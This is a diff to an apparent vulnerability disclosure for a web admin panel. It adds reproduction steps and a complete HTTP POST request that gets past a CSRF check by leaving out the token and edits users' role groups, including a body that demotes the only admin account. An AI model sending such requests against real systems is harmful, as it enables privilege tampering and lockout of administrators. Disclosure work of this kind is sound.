@@ -33,7 +33,7 @@ In the user management page, the username, hash, and rolehash[0] parameters are 
 ![image](https://github.com/user-attachments/assets/4ae05941-9ce0-44b7-9e27-6c3addf23355)
 4.Log in as user a and notice that the interface is empty.
 ![image](https://github.com/user-attachments/assets/2e9dc7c1-8f16-4aaa-8ea3-18ef40a2ad9a)
-5.Below is the complete structure of the data packet:
+5.Below is the complete structure of the data packet(When reproducing, please modify the `Cookie` to match your account. Additionally, remove the `csrf_XXX` parameter, as it has already been removed in the constructed POST packet. Leaving it empty will bypass the CSRF check.):
 
 ```http
 POST /admin?do=admin:user:editPost HTTP/1.1
@@ -42,16 +42,24 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 F
 Accept: application/json, text/javascript, */*; q=0.01
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
-Referer: http://10.0.93.90/admin?do=admin:user:edit&id=2
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 X-Requested-With: XMLHttpRequest
-Content-Length: 90
+Content-Length: 68
 Origin: http://10.0.93.90
 Connection: close
-Cookie: token_672065=c09db2a11c209391046dc7c4c9d83053; csrf_672065=179ab53e; token_c075a1=918201e1160a21fbf851ec06b7abce41; csrf_c075a1=2963664c; token_da3622=36a824c20e91a443ff207e1e15b82ffd; csrf_da3622=f5c8ede5; token_595ef5=314802c11146c95fad9ea45f332ad7ee; csrf_595ef5=04da0bce
+Cookie: token_595ef5=592c2e882068577109097bafcc27e7a2;
+Priority: u=0
 
-username=a&hash=a&enabled=on&rolehash%5B0%5D=admin&passwd=&passwd_2=b&csrf_595ef5=04da0bce```
+username=a&hash=a&enabled=on&rolehash%5B0%5D=admin&passwd=&passwd_2=
+```
+![image](https://github.com/user-attachments/assets/8fb7c68f-69c8-4989-b246-3e2817ddb547)
+6.Although it shows success here, when we refresh the page, we find that the a account's privileges have not changed.
+![image](https://github.com/user-attachments/assets/0263d197-8b00-4061-a3a6-804aa8488c22)
+7.However, if we modify the parameters in the data packet as follows:
 
-6.
+```http
+username=admin&hash=admin&enabled=on&rolehash%5B0%5D=aaa&passwd=&passwd_2=
+```
 
+This will change the sole admin user in the admin group to the aaa group, effectively stripping it of all privileges.
 
